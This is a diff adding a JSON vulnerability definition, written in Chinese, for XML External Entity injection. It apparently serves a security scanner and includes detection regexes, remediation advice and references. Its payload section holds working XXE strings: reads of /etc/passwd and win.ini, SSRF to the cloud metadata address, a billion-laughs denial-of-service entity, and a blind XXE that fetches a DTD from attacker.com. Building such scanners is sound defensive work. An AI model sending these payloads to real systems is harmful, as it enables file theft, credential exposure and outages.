@@ -1,0 +1,52 @@
+{
+    "xxe": {
+        "name": "XML外部实体注入",
+        "cwe_id": "CWE-611",
+        "cvss_base_score": 9.1,
+        "description": "XXE漏洞允许攻击者通过XML外部实体注入访问服务器上的敏感文件或执行攻击",
+        "impact": "敏感文件读取、SSRF攻击、拒绝服务、远程代码执行(某些情况)",
+        "payloads": {
+            "file_read": [
+                "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>",
+                "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///c:/windows/win.ini\">]><foo>&xxe;</foo>",
+                "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/hosts\">]><foo>&xxe;</foo>"
+            ],
+            "ssrf": [
+                "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://internal.server/\">]><foo>&xxe;</foo>",
+                "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://169.254.169.254/latest/meta-data/\">]><foo>&xxe;</foo>"
+            ],
+            "dos": [
+                "<!DOCTYPE lolz [<!ENTITY lol \"lol\"><!ELEMENT lolz (#PCDATA)> <!ENTITY lol1 \"&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;\"> <!ENTITY lol2 \"&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;\"> <!ENTITY lol3 \"&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;\"> <!ENTITY lol4 \"&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;\"> <!ENTITY lol5 \"&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;\"> <!ENTITY lol6 \"&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;\"> <!ENTITY lol7 \"&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;\"> <!ENTITY lol8 \"&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;\"> <!ENTITY lol9 \"&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;\"> ]><lolz>&lol9;</lolz>"
+            ],
+            "blind_xxe": [
+                "<!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"http://attacker.com/evil.dtd\">%xxe;]><foo></foo>"
+            ]
+        },
+        "detection_patterns": [
+            "xml\\.parse\\s*\\(",
+            "lxml\\.etree\\.parse\\s*\\(",
+            "xmlrpc\\.server\\.SimpleXMLRPCServer",
+            "minidom\\.parseString\\s*\\(",
+            "DocumentBuilder\\.parse\\s*\\(",
+            "SAXParser\\.parse\\s*\\("
+        ],
+        "safe_patterns": [
+            "xml\\.parse\\s*\\(.*resolve_entities=False.*\\)",
+            "defusedxml\\.xml\\.parse",
+            "使用安全的XML解析器"
+        ],
+        "remediation": [
+            "禁用XML外部实体解析",
+            "使用安全的XML解析器(defusedxml等)",
+            "对XML输入进行严格验证",
+            "使用白名单验证XML内容",
+            "实施输入长度限制",
+            "使用JSON等安全的数据格式替代XML"
+        ],
+        "references": [
+            "https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing",
+            "https://cwe.mitre.org/data/definitions/611.html",
+            "https://portswigger.net/web-security/xxe"
+        ]
+    }
+}
